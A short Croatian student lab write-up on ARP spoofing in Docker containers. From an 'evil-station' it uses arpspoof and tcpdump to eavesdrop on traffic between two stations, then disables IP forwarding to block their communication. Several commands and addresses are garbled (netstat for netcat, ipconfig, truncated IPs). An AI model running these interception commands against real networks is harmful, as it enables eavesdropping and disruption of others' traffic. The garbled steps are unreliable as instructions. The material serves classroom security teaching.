# ARP- spoofing

Klonirani git repozitorij: git clone https://github.com/mcagalj/SRP-2021-22

U direktoriju pokrecemo bash script: sh./start/sh

Udimo u docker container s naredbom docker exec -it station-1 bash i pingamo station - 2 sa ping station-2

Dohvati containerovu IP i Mac adresu sa naredbom ipconfig

station-1: 

IP: 172.21.02

ETH: 00:02

station-2:

IP: 172.21.04

ETH: 00:04

evil-station:

IP: 172.21.03

ETH: 00:03

Zapocinjemo razgovor izmedu dva stationa. Na Station-2 unosimo komandu: netstat -l -p 8000, a na Station-1 komandu: netstat station-2 8000. Time je uspostavljena komunikacija izmedu te dvije postaje.

Nakon toga ulazimo u evil-station i koristimo naredbe tcpdump za 'prisluskivanje' razgovora, arpspoof -t station-1 -r station-2.

Kad to napravimo unesemo naredbu:  tcpdump -XA station-1 and not arp.

Za blokiranje komunikacije izmedu te dvi postaje: echo 0 > /proc/sys/net/ipv4/ip_forward.
